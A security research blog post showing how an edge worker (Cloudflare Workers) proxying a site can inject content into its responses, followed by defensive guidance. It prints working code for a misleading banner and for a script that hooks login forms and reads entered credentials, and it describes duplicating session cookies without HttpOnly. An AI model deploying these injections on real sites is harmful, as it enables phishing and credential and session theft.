---
layout: post
title: "Browser-Side Reverse Proxying Using Edge Infrastructure"
subtitle: "Intercepting and manipulating browser traffic at the edge using Javascript instrumentation"
date: 2026-1-09 00:00:00 +0100
categories: [red-team, web-security, tradecraft, infrastructure, blog]
tags: [browser-security, reverse-proxy, edge-workers, cloudflare-workers, javascript-instrumentation, client-side-attacks, traffic-interception, trust-boundary, defensive-evasion, supply-chain-attack, mitre-attck, mitre-attack]
---
**Most browser attacks don't need browser exploits.** They rely on controlling a delivery path the browser already trusts.

Modern web apps assume that if traffic arrives over HTTPS, then it is safe. That assumption breaks the moment an intermediary sits inside the trust path, not as malware or as a visible man-in-the-middle, but as a legitimate infrastructure operating as designed.

This post examines browser-side reverse proxying using edge workers: a technique where responses are intercepted and JavaScript is instrumented before they ever reach the user's browser. No TLS breaking. No browser bugs. No extensions. Just what could be possible when trusted delivery paths are no longer passive.

## Research Methodology

All tests were conducted in a lab environment using infrastructure under my control. I deployed a modern web application on a dedicated subdomain to examine real-world production behaviour, including HTTPS, secure cookies, and standard browser protections. I applied some baseline hardening like Content Security Policy, to avoid drawing conclusions from misconfiguration rather than browser behavior.

## Intercepting Responses at the Edge

There are various edge workers available and suitable for this, like the AWS lambda, Akamai EdgeWorkers and Fastly Compute@Edge. However in this post Cloudflare Workers was utilized because it is free, easy to set up, and provides powerful response manipulation capabilities via the HTMLRewriter API. Workers run JavaScript on Cloudflare's edge network, allowing interception and modification of responses before they reach the browser all while preserving end-to-end HTTPS encryption.

## Where the Edge Sits in the Browser Request Path

From the browser's perspective, a web request follows a simple model:

- The browser resolves the domain via DNS
- A TLS connection is established
- The request is sent to the server
- A response is returned and rendered

With the explosion of cloud computing and CDNs, in modern deployments, the server is rarely the origin application, most times it is a reverse proxy handling the requests.

A reverse proxy traditionally sits in front of a server , receiving client requests and forwarding them upstream. When clients send requests to the origin server of a website, those requests are intercepted at the network edge by the reverse proxy server. The reverse proxy server will then send requests to and receive responses from the origin server.

In modern web architectures, this role is commonly fulfilled by CDN and edge infrastructure. Requests are terminated at the edge, processed, and only then forwarded to the origin application. Responses follow the same path in reverse.


```
Browser-->Edge/CDN-->Origin
Origin--->Edge/CDN-->Browser
```

At a functional level, an edge worker serves as a fully programmable reverse proxy embedded in the trusted CDN delivery path, executing custom code on a global edge network rather than a single server granting unparalleled abilities to dynamically instrument responses at scale without the latency, management overhead, or buffering limitations of traditional proxies.

Rather than forwarding traffic transparently, the edge can actively participate in request and response handling. This allows it to inspect, modify, and re-emit responses while maintaining the original origin context from the browser’s point of view.


**This means the Edge is not an observer. It is an active participant in the request lifecycle.**

If the edge is an active participant in the request lifecycle, then the question is not if it can influence what the browser sees but how much 

## Edge Mediated UI Manipulation (Baseline vs Modified Response)

When a browser requests a homepage, the request terminates at the edge. The origin server returns a legitimate response, authored by the application developer and protected by HTTPS.

Before response reaches the browser, it is parsed and modified at the edge. Additional markup and scripts are injected, after which the response continues its normal delivery path.

From the browser's perspective nothing about this exchange is abnormal. The domain is unchanged. The TLS session is valid. The response is same-origin and fully trusted

To demonstrate the practical impact of this capability, the first experiment focuses on visible, non-invasive response manipulation of a public page. The subdomain **test.codedintrusion.com** is fully proxied through cloudflare worker.

using a basic proxy on a cloudflare worker domain **research.codedintrusion.workers.dev/**

```
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // Set the upstream origin url
  url.hostname = 'test.codedintrusion.com'  // Origin URL
  
  // Preserve everything else (path, query, method, headers, body)
  const newRequest = new Request(url.toString(), request)
  
  return fetch(newRequest)
}
```

![Explicitly proxying Origin URL through Cloudflare Worker](/assets/images/reverse-proxy/original_cloudflare_proxy.png)
*Worker acting as a transparent proxy in the trusted delivery path*

![Original_response](/assets/images/reverse-proxy/original_response.png)
*origin proxied through worker with no manipulation*

At this point, the edge worker is operating as a transparent reverse proxy. The browser receives a response that is byte for byte identical to the origin, except that it is delivered through the worker controlled trust path.

With this baseline established, the next step is to introduce a minimal, visible modification to the response in order to demonstrate that the edge can actively influence what the browser renders without breaking TLS, changing domains, or triggering browser security indicators.

### Introducing a Controlled UI Modification

To demonstrate edge mediated response manipulation, the worker was updated to inject a small banner at the top of the document body using Cloudflare's HTMLRewriter API.

The injected content is simple but it clearly demonstrates how control over a trusted delivery path can influence user perception and decision making without altering application logic or triggering any browser security signals.

By modifying only the rendered interface, the edge is able to guide the user behavior, suppress actions, or introduce misleading context, all while the browser continues to treat the response as fully legitimate and same-origin.


The following worker logic proxies the original request upstream and modifies the HTML response before it reaches the browser:

```
addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // Set the upstream origin url
  url.hostname = 'test.codedintrusion.com'  // Origin URL
  
  // Preserve everything else (path, query, method, headers, body)
  const originRequest = new Request(url.toString(), request)
  const response = await fetch(originRequest)
  //Rewriite Response using HTMLRewriter API
  return new HTMLRewriter()
      .on('body', new BannerInjector())
      .transform(response)
}
// Inject a full-width banner at the top of <body>
class BannerInjector {
  element(element) {
    element.prepend(`
      <div id="edge-banner">
        ⚠️ SITE CURRENTLY UNDER MAINTENANCE ⚠️
        <div class="subtext">
          Service will resume shortly. Do not attempt to log in.
        </div>
      </div>

      <style>
        #edge-banner {
          position: fixed;
          top: 16px;
          left: 50%;
          transform: translateX(-50%);
          z-index: 999999;

          background: #ff4444;
          color: #fff;

          padding: 14px 28px;
          border-radius: 10px;

          font-size: 20px;
          font-weight: 700;
          text-align: center;

          max-width: 90%;
          width: max-content;

          box-shadow: 0 10px 25px rgba(0,0,0,0.25);

          pointer-events: none; /* critical */
        }

        #edge-banner .subtext {
          font-size: 14px;
          font-weight: 400;
          margin-top: 6px;
          opacity: 0.95;
        }
      </style>
    `, { html: true })
  }
}

```

![Cloudflare worker injecting a banner using HTMLRewriter](/assets/images/reverse-proxy/worker_banner_injection.png)
*Edge worker proxying the origin and injecting additional markup before delivery*

![Homepage rendered with edge injected banner](/assets/images/reverse-proxy/edge_modified_ui.png)
*Browser rendering a modified response delivered through a trusted edge path*

From the browser's perspective, this response is entirely legitimate. The domain is unchanged, the TLS session is valid, and the content is delivered from the expected origin. No browser warnings are triggered, and no security controls are violated.

Yet the rendered page now contains logic and messaging that was never authored by the application developer. The modification occurs entirely within a trusted delivery path, highlighting how control over edge infrastructure directly translates into control over client side execution.

## From UI Manipulation to Logic Instrumentation

If arbitrary markup can be injected into a trusted response, the next question is how far this influence extends into client-side logic execution.

In this experiment, the injected script attaches an event listener to form submissions and logs the captured input values to the browser console. data was intentionally not transmitted off-site. The objective is to demonstrate that injected logic executes with the same privileges as application authored javascript.

The injected script performs the following actions:

- Hooks form submission
- Reads input field values
- Logs the captured data to the developer console

The injected script demonstrates that edge-injected JavaScript executes with identical privileges to application authored code. This example observes credential fields.

```
class ScriptInjector {
  element(element) {
    element.append(`
    <script type="text/javascript">
        // Wait for the form to appear (Ghost renders dynamically)
        const observer = new MutationObserver(function(mutations, obs) {
          const form = document.querySelector('form#login, form.gh-signin, form');
          if (form) {
            obs.disconnect();

            const submitButton = form.querySelector('button[type="submit"]');
            if (submitButton) {
              submitButton.addEventListener('click', captureCredentials);
            } else {
              // Fallback: hook form submit (in case button changes)
              form.addEventListener('submit', captureCredentials);
            }
          }
        });

        function captureCredentials(event) {
          const emailInput = document.querySelector('input[type="email"], input[name="identification"]');
          const passwordInput = document.querySelector('input[type="password"], input[name="password"]');

          const email = emailInput ? emailInput.value.trim() : '(not found)';
          const password = passwordInput ? passwordInput.value : '(empty)';

          console.log('%c[EDGE-INJECTED SCRIPT] Ghost Admin Credentials Captured:', 'color: red; font-size: 20px; font-weight: bold;');
          console.log('%cEmail:     ' + email, 'font-size: 16px;');
          console.log('%cPassword:  ' + (password || '(empty)'), 'font-size: 16px;');
          console.log('%cTimestamp: ' + new Date().toISOString(), 'font-size: 12px; color: gray;');
          console.log('%c→ Read client-side by edge-injected JS', 'font-size: 12px; color: orange;');
        }

        // Start observing
        observer.observe(document.documentElement, {
          childList: true,
          subtree: true
        });

        // Also check immediately in case form is already there
        if (document.querySelector('form#login, form.gh-signin, form')) {
          observer.disconnect();
          captureCredentials();
        }
      </script>
    `, { html: true });
  }
}
```
![Cloudflare worker console](/assets/images/reverse-proxy/worker_script_injection.png)
*Updated worker console to apply script injection to head*

![Developer console showing instrumented form submission](/assets/images/reverse-proxy/console_logged_form.png)
*Injected script executing in the same origin context of the application*

Because the injected logic executes within the application's logic, it inherits all the trust and privileges of first party JavaScript. From the browser's security model there is no distinction between code authored by the developer and code introduced via a trusted edge intermediary.

This is not a browser vulnerability. It is a consequence of where trust is placed in modern delivery architectures.

At this stage, edge has demonstrated control over both presentation and client-side logic. The remaining question is how this influence interacts with session state and browser security boundaries.

## Edge Influence Over Session State

Modern browsers enforce strict boundaries around session state, particularly through cookie attributes such as `HttpOnly`.

It is commonly assumed that these attributes represent hard security guarantees that cannot be bypassed by client side code. This section examines a more subtle question: What happens when the trusted delivery path itself redefines how session state is issued ?

### Cookie Security and Trust Boundary

Browsers do not allow JavaScript to directly read cookies marked `HttpOnly`. This restriction is enforced correctly and remains intact throughout this experiment. The edge worker does not read protected cookies. Instead, it operates at a different layer of trust: the response issuance layer.

### Edge Mediated Cookie Policy Duplication

In this experiment, the edge worker intercepts authenticated responses from the origin and observes the `Set-Cookie` headers used to establish a session.

Rather than modifying the original session cookie, the worker issues a second cookie with identical value and scope, but with altered attributes. This duplicate cookie is intentionally marked without `HttpOnly` to observe how the browser treats policy changes originating from a trusted delivery path. Because the duplicated cookie is delivered over a valid TLS session, and within the expected request flow, the browser accepts it without warning.

This behavior does not violate browser's security model. From the browser's perspective, the origin has simply chosen to issue an additional cookie with different handling instructions.

This experiment does not extract or tamper with the original session cookie. it demonstrates that session policy itself is defined upstream of browser enforcement.

The screenshots below show the result of this interaction:
- A duplicated session cookie issued by the edge.
- The original session cookie remains `HttpOnly`
- The duplicated cookie is readable by JavaScript

![Worker Duplicating cookie](/assets/images/reverse-proxy//worker_duplicating_cookie.png)
*Worker duplicating cookie to expose similar value with changed policy*

![Edge injectcted JavaScript Observing duplicated session](/assets/images/reverse-proxy/edge_injected_javascript_exposed_cookie.png)
*Edge injectcted JavaScript Observing duplicated session*

It is Important to emphasize that this behavior does not represent a weakness in Ghost itself. Ghost correctly marks its session cookies as `HttpOnly` and enforces multi-factor authentication for administrative access.

The observed behavior arises from the fact that cookie security attributes are policy declarations issued by the origin. When a trusted edge intermediary is allowed to redefine those declarations, browser enforcement remains consistent with its design.

**The edge does not bypass protections, It determines who is allowed to define them.**

Until organizations treat CDNs and edge providers as critical trust boundaries, these attacks will remain viable and stealthy.

### Implications for Phishing and Identity Attacks

While this research focuses on controlled instrumentation and observation, the same architectural properties enable highly effective phishing operations.
Because the browser maintains  same-origin trust, an edge-mediated proxy can:
- Serve the legitimate application interface.
- Inject credential or token instrumentaion
- Preserve HTTPS indicators and valid certificates
- Avoid browser warnings entirely.

Unlike traditional phishing sites, this approach does not rely on lookalike domains or closed assets. The browser interacts with the expected origin through a trusted delivery path, while the edge controls response content and execution.

## Real-World Precedent: Edge and Supply Chain Compromise

The techniques demonstrated in this post are not theoretical. Similar trust-path abuses have resulted in large scale real world compromises.

In 2021, the BadgerDAO front-end was compromised through a supply chain attack that injected malicious JavaScript into a trusted application delivery path. The injected logic prompted users to approve transactions that drained over **$120 Million** in assets, without breaking TLS or triggering browser warnings. From the browser's perspective, the application was legitimate, the compromise occured entirely within the trusted delivery path.

Salesloft/Drift integration compromise (2025): Attackers breached Salesloft's Drift chatbot (Salesforce-integrated), stole OAuth tokens, and accessed sensitive data across hundreds of customer environments (including major security vendors). The attack exploited trust in third-party SaaS delivery paths, leading to widespread credential and data exposure without direct origin modification.

Polyfill.io CDN takeover (2024): In February 2024, the popular polyfill.io domain (a widely used JavaScript polyfill service) was acquired by Chinese CDN provider Funnull. By late June 2024, attackers began injecting malicious code into served polyfill.js scripts, redirecting mobile users to scam sites (gambling/adult content) without breaking TLS or domains. Over 110,000 websites (some estimates up to 380,000+) were affected, as the trusted CDN delivery silently propagated malware to downstream sites. Similar incidents have been observed across DeFi platforms and web applications where control over front-end delivery infrastructure enabled credential harvesting, session abuse, or logic manipulation without modifying origin application itself.


## MITRE ATT&CK Mappings

| Tactic          | Technique                       | Relevance                          |
| --------------- | ------------------------------- | ---------------------------------- |
| Initial Access  | T1195 – Supply Chain Compromise | Edge/CDN trusted path abuse        |
| Execution       | T1059.007 – JavaScript          | Injected client-side logic         |
| Collection      | T1056 / T1115                   | Credential and session observation |
| Defense Evasion | T1564                           | Same-origin trust, no warnings     |
| Phishing        | T1566                           | Infrastructure-mediated phishing   |



## Defending the Edge Trust Boundary

Edge mediated attacks exploit delegated trust. As a result, mitigation must focus on controlling who is allowed to modify responses, not on additional client-side checks. Defence requires layered governance across infrastructure, delivery and monitoring.

1. Treat Edge Configuration as Production Code
   
	Edge workers, CDN rules, and response rewriting logic should be treated with the same rigor as application code.

	- Enforce version control and peer review for edge worker deployments.

	- Restrict who can publish and modify edge logic.

	- Log and alert on all edge configuration changes.

	- Seperate development, staging, and production edge environments.

	An attacker with edge write access effectively has first party JavaScript execution.

2. Harden CDN and Edge Access Path

	Most real world incidents begin with compromised credentials or excessive permission

	- Enforce MFA on CDN provider accounts

	- Use least-privilege roles for edge and worker management

	- Rotate API tokens regularly and scope them narrowly

	- Monitor for anomalous edge deployments or rule changes

	Edge compromise is often indistinguishable from legitimate adminstration without strong auditing.

3. Constrain what the Edge is Allowed to Change

	While edge logic may be necessary, its authority should be minimized.

	- Avoid allowing edge logic to modify authentication or session responses

	- Prevent edge workers from issuing or altering Set-Cookie headers where possible

	- Use allowlists for headers that edge logic may rewrite

	- Prefer immutable response paths for login and identity endpoints

	Not all routes should be equally mutable.

4. Use Content Security Policy Correctly

	- CSP does not prevent edge injected scripts by default, but it can limit blast radius.

	- Avoid unsafeinline wherever possible

	- Use nonces or hashes for application scripts

	- Monitor CSP violation reports for unexpected script execution paths

	CSP is not a guarantee, it is a detection and containment mechanism.

5. Monitor the Delivery Path, Not Just the Origin

	Traditional security tooling often stops at the origin server.

	- Capture and inspect responses as delivered to real users

	- Compare origin responses with edge delivered responses

	- Alert on unexpected markup or script injection

	- Treat unexplained client-side behavior as a delivery integrity issue

	If you do not observe the edge, you do not control it.

6. Assume the Browser Will Trust the Edge

	Browsers correctly trust what the origin (or its delegate) delivers.

	- Do not assume HttpOnly, Secure, or TLS are absolute guarantees

	- Model edge compromise as part of your threat model

	- Include CDN and edge compromise scenarios in incident response planning

	Browser security is functioning as designed. The failure mode is architectural.


There is no browser side indicator for edge mediated manipulation. When delivery path is trusted, the browser has no basis to distinguish legitimate content from injected logic.

The edge defines the security posture.

## From Edge Injection to Persistent Client Control

All demonstrations so far rely on responses being intercepted at delivery time. However, modern browsers include a mechanism explicitly designed to persist execution logic beyond a single response: **Service Workers**.

When combined with edge mediated response manipulation, this introduces a new dimension persistence inside the browser itself, surviving reloads, navigation, and temporary network changes.

In the next post, we explore how edge-injected responses can bootstrap client-side persistence through Service Workers, and how this shifts the trust boundary from delivery to residency.

At that point, the edge is no longer just influencing what the browser sees—it influences what the browser remembers.

### Further Reading

- [BadgerDAO Front-End Compromise (2021): Post-mortem and analysis](https://zengo.com/the-badgerdao-hack-what-really-happened-and-why-it-matters/)

- [Polyfill.io CDN takeover (2024)](https://thehackernews.com/2024/06/over-110000-websites-affected-by.html)

- [OWASP: Supply Chain Attacks](https://cheatsheetseries.owasp.org/cheatsheets/Software_Supply_Chain_Security_Cheat_Sheet.html)

- [Cloudflare Workers Security Model](https://developers.cloudflare.com/workers/learning/security-model/)



